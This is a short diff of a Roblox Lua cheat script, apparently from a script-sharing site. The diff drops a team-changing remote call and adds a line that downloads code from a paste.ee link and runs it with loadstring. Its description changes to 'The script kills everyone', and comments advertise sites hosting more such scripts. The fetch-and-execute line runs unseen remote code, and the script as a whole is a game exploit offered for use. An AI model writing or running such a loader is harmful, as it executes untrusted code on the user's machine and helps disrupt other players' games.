@@ -1,14 +1,11 @@
 -- find more powerfull verified and New Scripts here : https://script-pastebin.com
 
-local teamremote = game.ReplicatedStorage.Remote.changeTeam
-local team = game:GetService("Teams")["TEAM NAME HERE"].TeamColor
-
-teamremote:InvokeServer(team)
+loadstring(game:HttpGet("https://paste.ee/r/sQvWi/0"))();
 
 -- find more powerfull verified and New Scripts here : https://scriptpastebin.io
 
 --[[ Script Description:
 
-							Script to open all commands
+							The script kills everyone
 						
 ]]
